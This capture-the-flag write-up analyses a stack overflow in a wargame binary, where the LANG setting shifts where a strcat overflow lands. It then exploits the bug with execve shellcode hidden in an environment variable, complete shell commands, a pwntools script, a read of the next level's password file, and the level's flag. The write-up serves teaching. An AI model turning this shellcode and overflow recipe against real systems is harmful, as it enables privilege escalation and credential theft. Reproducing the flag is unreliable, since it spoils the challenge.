# Bonus 2

Same recon as level0: SUID **bonus3**. `readelf -l` shows `GNU_STACK` as `RWE` and there is no canary in `greetuser`'s prologue: NX is off and nothing detects a stack smash before it takes effect.

## Analysis

```c
int language;  // global, set from the LANG env var

void greetuser(void) {
    char buf[64] = {0};
    if (language == 1)       strcpy(buf, "Hyvää päivää ");  // fi (UTF-8)
    else if (language == 2)  strcpy(buf, "Goedemiddag! ");   // nl
    else                      strcpy(buf, "Hello ");
    strcat(buf, /* main's buf, passed in on the stack */);   // no bound -> overflow
    puts(buf);
}

int main(int argc, char **argv) {
    char buf[76] = {0};
    strncpy(buf,      argv[1], 40);   // no terminator at exactly 40
    strncpy(buf + 40, argv[2], 32);   // no terminator at exactly 32
    /* set language from getenv("LANG") */
    greetuser();   // buf is copied onto greetuser's stack, where strcat reads it
}
```

Two `strncpy` calls at exactly 40 and 32 bytes leave no terminator, the same trick as bonus0, fusing `argv[1] + argv[2]` into one 72-byte blob with no null byte anywhere inside it. `greetuser` prepends a greeting to its own 64-byte `buf`, then `strcat`s that 72-byte blob onto it with no bound, walking straight past `greetuser`'s own saved return address.

> **LANG controls where the overflow lands.** `strcat` starts writing at `greeting_start + strlen(greeting)`, so the length of the greeting decides how many bytes of our 72-byte blob still fit before `greetuser` returns, and therefore which byte of the blob lands on the saved return address. `LANG` picks the greeting, so `LANG` is really choosing our offset.

`disas greetuser` shows the real base of that buffer is `ebp-0x48` (the ASM uses `lea -0x48(%ebp),%eax` for every greeting variant; Ghidra's `local_4c` name for it is off by one and not to be trusted). The return address sits at `ebp+4`, not somewhere we have to guess: the prologue's `push %ebp; mov %esp,%ebp` saves the caller's `ebp` at the address `esp` had on entry, which is exactly where `call` had just pushed the return address, four bytes below it. So relative to the new `ebp`, the saved caller's `ebp` is always at `ebp+0` and the return address is always the 4 bytes right above it, at `ebp+4`, in every function, not just this one. Distance from the start of our buffer to the return address: `ebp+4` minus `ebp-0x48` = `0x4c` = **76 bytes**.

### Measuring the three greetings

The doc-comment lengths above are how many bytes the *literal* takes including its C string terminator; what actually matters for `strcat`'s starting position is `strlen()`, the length *without* the terminator. Running the binary with each `LANG` value and measuring the printed greeting settles it directly:

```
$ LANG= ./bonus2 AAAA BBBB
Hello AAAA
$ LANG=fi ./bonus2 AAAA BBBB
Hyvää päivää AAAA
$ LANG=nl ./bonus2 AAAA BBBB
Goedemiddag! AAAA
```

`"Hello "` is 6 bytes, `"Goedemiddag! "` is 13, and `"Hyvää päivää "` is 18, not 19: it has 13 visible characters but 5 of them are `ä`, which UTF-8 encodes as 2 bytes each, so `8 plain bytes + 5*2 = 18`. Subtract each from the 76-byte distance to get how many bytes of our blob are still ahead of the return address when `strcat` starts, and subtract 40 more (the length of `argv[1]`) to land inside `argv[2]`:

| LANG | Greeting | `strlen` | Bytes left to EIP (`76 - strlen`) | `argv[2]` offset (`− 40`) |
|---|---|---|---|---|
| unset | `Hello ` | 6 | 70 | 30 |
| fi | `Hyvää päivää ` | 18 | 58 | 18 |
| nl | `Goedemiddag! ` | 13 | 63 | 23 |

The unset row only reaches offset 30, but our blob is only 72 bytes long (indices 0..71), so only 2 of the 4 return-address bytes (indices 70 and 71) are ours; the top 2 bytes of EIP stay whatever they already were. `LANG=fi` and `LANG=nl` both land fully inside the blob with room for all 4 bytes. Check all three against the real crash address with a cyclic pattern (`Aa0Aa1Aa2...`, each 4-byte window unique) as `argv[2]`:

```
$ LANG=fi ./bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab   # under gdb
Program received signal SIGSEGV.
0x41366141 in ?? ()      # "Aa6A" -> starts at index 18, exactly the fi row above

$ LANG=nl ./bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab   # under gdb
Program received signal SIGSEGV.
0x38614137 in ?? ()      # "7Aa8" -> starts at index 23, exactly the nl row above

$ ./bonus2 $(python -c 'print "A"*40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab   # LANG unset, under gdb
Program received signal SIGSEGV.
0x08006241 in ?? ()      # low 2 bytes "Ab" (index 30) are ours; the high 2 bytes (0x0800) are leftovers, not a controlled address
```

All three match the table exactly, and the unset case shows the predicted partial hit: our bytes only ever reach the bottom half of EIP. (Instead of hand-decoding each crash value into letters, you can feed it straight into a pattern offset tool, e.g. [wiremask's buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) or pwntools' `cyclic_find()`, since this is the same letter+letter+digit cyclic sequence those tools produce.) `LANG=fi` gives the most room in `argv[2]` after the 4-byte address (32 − 4 − 18 = 10 filler bytes), so that is the one we use.

## Exploit

NX is off, so we run stack shellcode. The problem is space: `argv[2]` is capped at 32 bytes and every one of them is already spoken for (18 padding + 4 address + 10 filler), so there is no room left in the overflow itself to also carry a NOP sled and shellcode.

Instead we smuggle the shellcode in through an [environment variable](../knowledge_base/shellcode_injection.md#environment-variable-trick). Environment variables aren't declared anywhere in `bonus2`'s own code, they're copied onto the process's stack by the kernel before `main` ever runs, in their own region above everything the program allocates for itself. Their size is whatever we hand to `export`, not something the vulnerable function reserved for us, so unlike `argv[2]` (fixed at 32 bytes by the `strncpy` call) or bonus0's `buffer` (fixed at 4096 bytes by its `char buffer[4096]` declaration), there is no cap here at all. We only need the overwritten return address to point somewhere inside it.

### Shellcode (28 bytes)

Same as bonus0, execve(`/bin/sh`):

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Address of the sled

Export it behind a 4096-byte NOP sled, a wide landing zone we can afford now that size is free:

```bash
$ export LANG=fi
$ export SHELLCODE=$(python -c 'print "\x90"*4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

```
(gdb) b *main
(gdb) r AAAA BBBB
(gdb) p (char *)getenv("SHELLCODE")
$1 = 0xbfffee8c "\220\220\220..."
```

The sled spans `0xbfffee8c` to `0xbfffee8c + 4096 - 1 = 0xbffffe8b`. Aim well inside it rather than at the very start, the same margin-of-safety reasoning as bonus0's sled: `0xbfffee8c + 0x800 = 0xbffff68c` → little-endian `\x8c\xf6\xff\xbf`.

### Run

`argv[1]` = 40 `A`s, `argv[2]` = 18 `A`s + return address + 10 `B`s (= 32 bytes, no terminator):

```bash
$ export LANG=fi
$ export SHELLCODE=$(python -c 'print "\x90"*4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "A"*18 + "\x8c\xf6\xff\xbf" + "B"*10')
id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

Flag: `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`

## Alternative: pwntools

```python
from pwn import *
context.arch = 'i386'

print(cyclic_find(0x41366141))   # 18, same offset the table above found by hand

sled = b'\x90' * 4096
shellcode = asm(shellcraft.sh())

env = os.environ.copy()
env['LANG'] = 'fi'
env['SHELLCODE'] = sled + shellcode

argv2 = b'A' * 18 + p32(0xbffff68c) + b'B' * 10
io = process(['./bonus2', b'A' * 40, argv2], env=env)
io.interactive()
```

`cyclic_find()` replaces the "decode the crash address into letters, find the index" step, and `p32()` replaces the little-endian byte reversal. It does not replace the `LANG`/`strlen`/`ebp-0x48` reasoning that produced the offset table in the first place, or the gdb session that found the sled's address via `getenv`, those depend on reading this specific binary, not on anything a library can guess.

